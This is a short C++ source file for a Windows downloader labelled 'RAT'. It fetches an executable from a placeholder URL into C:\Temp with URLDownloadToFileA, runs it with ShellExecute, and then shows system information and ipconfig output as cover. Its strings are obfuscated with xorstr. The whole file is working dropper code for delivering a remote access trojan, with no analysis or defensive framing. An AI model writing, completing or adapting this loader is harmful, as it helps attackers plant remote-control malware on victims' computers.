#include <iostream>
#include <Windows.h>
#include "xorstr.h"
#include <cstdlib>
#include <stdlib.h>








#pragma comment( lib, "Urlmon.lib" )

#include <stdio.h>
#include <string>
#include<TCHAR.H>
#include "ShellAPI.h"



using namespace std;







void dwnl()
{

	
    URLDownloadToFileA(nullptr, _("YOURlink"), _("C:\\Temp\\NAMEexeFile"), 0, 0);
    Sleep(35000);
    std::cout << _("[-----]") << endl;
    Sleep(1500);
    std::cout << _("Successfully uploaded") << endl;
    ShellExecute(NULL, _T("open"), _T("C:\\Temp\\NAMEexeFile"), NULL, NULL, SW_RESTORE);


}

void infmin()
{
    std::cout << _("Loading computer information...") << endl;;
    Sleep(2000);

    TCHAR Compname[20];
    DWORD namesize = 20;

    SYSTEM_INFO lpSystemInfo;
    GetSystemInfo(&lpSystemInfo);
    std::cout << endl << endl << _("System Info:  ") << endl;
    std::cout << "--------------------------------------------------------------------------------" << endl;
    {
        std::cout << "\t" << lpSystemInfo.dwActiveProcessorMask << _(" - Active Processor Mask") << endl;
        std::cout << "\t" << lpSystemInfo.dwPageSize << _(" - Page Size") << endl;
        std::cout << "\t" << lpSystemInfo.dwAllocationGranularity << _(" - Allocation Granularity") << endl;
        std::cout << "\t" << lpSystemInfo.dwNumberOfProcessors << _(" - Number Of Processors") << endl;
        std::cout << "\t" << lpSystemInfo.dwOemId << _(" - Oem Id") << endl;
        std::cout << "\t" << lpSystemInfo.dwProcessorType << _(" - Processor Type") << endl;
        std::cout << "\t" << lpSystemInfo.lpMaximumApplicationAddress << _(" - Maximum Application Address") << endl;
        std::cout << "\t" << lpSystemInfo.lpMinimumApplicationAddress << _(" - Minimum Application Address") << endl;
        std::cout << "\t" << lpSystemInfo.wProcessorArchitecture << _(" - Processor Architecture") << endl << endl;
        std::cout << "--------------------------------------------------------------------------------" << endl;
        Sleep(2000);
    }

    std::cout << endl;

    std::cout << _("Loading Global information...") << endl;

    system("C:\\Windows\\System32\\ipconfig");


    Sleep(3500);
}



int main(int argc, char* argv[])
{

   

    SetConsoleTitleA (xorstr("RAT"));
    system _("color 06");

    


    std::cout << _("Downloading RAT...") << endl;;
    dwnl();
	Sleep(4000);
    
    infmin();


  



    


}